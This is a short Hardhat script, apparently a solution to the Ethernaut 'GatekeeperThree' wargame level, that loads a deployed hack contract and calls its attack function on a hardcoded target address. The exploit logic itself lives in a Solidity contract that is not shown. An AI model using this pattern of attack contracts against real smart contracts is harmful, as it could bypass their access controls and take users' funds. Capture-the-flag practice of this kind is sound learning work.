const hre = require("hardhat");
const hackABI = require("../artifacts/contracts/GatekeeperThreeHack.sol/GatekeeperThreeHack.json").abi;

async function main() {

    const [deployer] = await hre.ethers.getSigners();
    console.log("Attacking using MetaMask account:", deployer.address);

    const hackAddress = "0x71b58C50Be9fb5ca345B0f7A2D67c74671f6B039";
    const gatekeeperThreeHack = new hre.ethers.Contract(hackAddress, hackABI, deployer);
    console.log('succssful initalize of hack contract')

    const result = await gatekeeperThreeHack.attack("0xf1861b6C31d96C5F7Fb93D8f80F2152E90247dC2");
    await result.wait();

    console.log("Attacked from hack contract", result.hash);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});